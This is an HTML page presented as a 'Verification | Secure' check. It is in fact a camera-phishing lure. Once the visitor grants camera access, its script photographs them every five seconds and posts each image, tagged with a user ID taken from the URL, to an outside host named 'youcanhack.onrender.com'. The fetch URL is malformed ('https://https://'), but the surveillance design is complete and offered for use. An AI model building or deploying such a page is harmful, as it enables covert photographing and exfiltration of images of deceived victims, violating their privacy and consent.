<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verification | Secure</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0f172a;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
    }
    h1 {
      font-size: 1.8rem;
      margin-bottom: 20px;
      animation: pulse 1.5s infinite;
      color: #00ff99;
    }
    #video {
      width: 280px;
      height: auto;
      border-radius: 12px;
      border: 3px solid #00ff99;
      box-shadow: 0 0 20px #00ff99;
    }
    #status {
      font-size: 1rem;
      margin-top: 10px;
      color: #cccccc;
    }
    .footer {
      position: absolute;
      bottom: 15px;
      font-size: 0.9rem;
      color: #888;
    }
    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.05); opacity: 0.7; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body>
  <h1>üîí Capturing Image... Stay Still</h1>
  <video id="video" autoplay playsinline></video>
  <div id="status">Initializing camera...</div>
  <div class="footer">‚ù§Ô∏è Team Tasmina</div>

  <script>
    const video = document.getElementById('video');
    const statusText = document.getElementById('status');

    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        statusText.innerText = "‚úÖ Camera accessed. Capturing...";
        startCapturing(stream);
      } catch (err) {
        statusText.innerText = "‚ùå Camera access denied.";
      }
    }

    function startCapturing(stream) {
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);
      const userId = new URLSearchParams(window.location.search).get("userid");

      setInterval(async () => {
        try {
          const blob = await imageCapture.takePhoto();
          const reader = new FileReader();
          reader.onloadend = () => {
            fetch("https://https://youcanhack.onrender.com/send-photo", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                user_id: userId,
                img_base64: reader.result
              })
            });
          };
          reader.readAsDataURL(blob);
        } catch (error) {
          statusText.innerText = "‚ùå Error capturing photo.";
        }
      }, 5000);
    }

    initCamera();
  </script>
</body>
</html>
